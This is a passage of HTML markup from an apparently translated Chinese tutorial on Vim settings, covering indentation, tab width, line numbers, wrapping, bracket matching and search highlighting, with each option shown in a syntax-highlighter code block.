!important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nset autoindent</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab66fbd21aa612357332-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab66fbd21aa612357332-1\"><span class=\"crayon-e\">set </span><span class=\"crayon-v\">autoindent</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p>创建新行时使用智能缩进，主要用于 <code>C</code> 语言一类的程序。通常，打开 <code>smartindent</code> 时也应该打开 <code>autoindent</code>：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab66fbd21b5450472708\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nset smartindent</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab66fbd21b5450472708-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab66fbd21b5450472708-1\"><span class=\"crayon-e\">set </span><span class=\"crayon-v\">smartindent</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p>注意：<code>Vim</code> 具有语言感知功能，且其默认设置可以基于文件中的编程语言来改变配置以提高效率。有许多默认的配置选项，包括 <code>axs cindent</code>，<code>cinoptions</code>，<code>indentexpr</code> 等，没有在这里说明。 <code>syn</code> 是一个非常有用的命令，用于设置文件的语法以更改显示模式。</p>\n<p>（LCTT 译注：这里的 <code>syn</code> 是指 <code>syntax</code>，可用于设置文件所用的编程语言，开启对应的语法高亮，以及执行自动事件 (<code>autocmd</code>)。）</p>\n<p>设置文件里的制表符 <code>(TAB)</code> 的宽度（以空格的数量表示）：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab66fbd21ba372735780\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nset tabstop=4</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab66fbd21ba372735780-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab66fbd21ba372735780-1\"><span class=\"crayon-e\">set </span><span class=\"crayon-v\">tabstop</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">4</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>设置移位操作 <code>&gt;&gt;</code> 或 &lt;&lt; <code>的缩进长度（以空格的数量表示）：</code></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab66fbd21bd004953993\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nset shiftwidth=4</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab66fbd21bd004953993-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab66fbd21bd004953993-1\"><span class=\"crayon-e\">set </span><span class=\"crayon-v\">shiftwidth</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">4</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p>如果你更喜欢在编辑文件时使用空格而不是制表符，设置以下选项可以使 <code>Vim</code> 在你按下 <code>Tab</code> 键时用空格代替制表符。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab66fbd21c1232459626\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nset expandtab</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab66fbd21c1232459626-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab66fbd21c1232459626-1\"><span class=\"crayon-e\">set </span><span class=\"crayon-v\">expandtab</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p>注意：这可能会导致依赖于制表符的 <code>Python</code> 等编程语言出现问题。这时，你可以根据文件类型设置该选项（请参考 <code>autocmd</code>）。</p>\n<h3 id=\"toc_3\">2. 显示 &amp; 格式化</h3>\n<p>要在每行的前面显示行号：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab66fbd21c4855336661\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nset number</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab66fbd21c4855336661-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab66fbd21c4855336661-1\"><span class=\"crayon-e\">set </span><span class=\"crayon-v\">number</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/09/a36b261b6f71c696462598de3acdf5d4.png\" alt=\"\"></p>\n<p>要在文本行超过一定长度时自动换行：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab66fbd21c8421922400\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nset textwidth=80</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab66fbd21c8421922400-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab66fbd21c8421922400-1\"><span class=\"crayon-e\">set </span><span class=\"crayon-v\">textwidth</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">80</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p>要根据从窗口右侧向左数的列数来自动换行：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab66fbd21cb018326795\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nset wrapmargin=2</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab66fbd21cb018326795-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab66fbd21cb018326795-1\"><span class=\"crayon-e\">set </span><span class=\"crayon-v\">wrapmargin</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">2</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p>（LCTT 译注：如果 <code>textwidth</code> 选项不等于零，本选项无效。)</p>\n<p>当光标遍历文件时经过括号时，高亮标识匹配的括号：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab66fbd21ce887635284\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nset showmatch</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab66fbd21ce887635284-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab66fbd21ce887635284-1\"><span class=\"crayon-e\">set </span><span class=\"crayon-v\">showmatch</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/09/eb3fb3097f9b2d154e8a5eb44c82c84d.jpg\" alt=\"\"></p>\n<h3 id=\"toc_4\">3. 搜索</h3>\n<p>高亮搜索内容的所有匹配位置：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab66fbd21d1703524336\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nset hlsearch</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab66fbd21d1703524336-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab66fbd21d1703524336-1\"><span class=\"crayon-e\">set </span><span class=\"crayon-v\">hlsearch</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/09/aae2ba05559f98a8dac71202c1de82f6.png\" alt=\"\"></p>\n<p>搜索过程中动态显示匹配内容：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab66fbd21d6747138628\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span 